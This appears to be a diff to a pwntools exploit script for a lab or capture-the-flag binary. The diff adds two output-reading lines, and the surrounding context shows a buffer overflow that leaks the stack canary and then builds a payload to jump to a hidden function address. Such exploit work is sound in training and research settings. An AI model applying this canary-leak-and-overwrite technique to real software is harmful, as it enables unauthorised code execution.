@@ -11,6 +11,8 @@ pty = process.PTY
 elf = context.binary = ELF("./binaries/binary-5-SG12-random")
 p = process(elf.path)
 
+print(p.recvline())
+
 print("Get the canary")
 payload = b'A'*100 + b'\x09'
 print("Send " + str(payload))
@@ -21,6 +23,8 @@ print("Receive output: " + str(output))
 random_canary = re.findall(r' [0-9A-F]{6,8} ', str(output), re.I)[0]  # STRING
 random_canary = int(random_canary, 16)  # INT
 random_canary = p32(random_canary)  # HEX
+
+print(p.recvline())
 
 print("Craft payload")
 address_of_secret_function = 0x80486c0
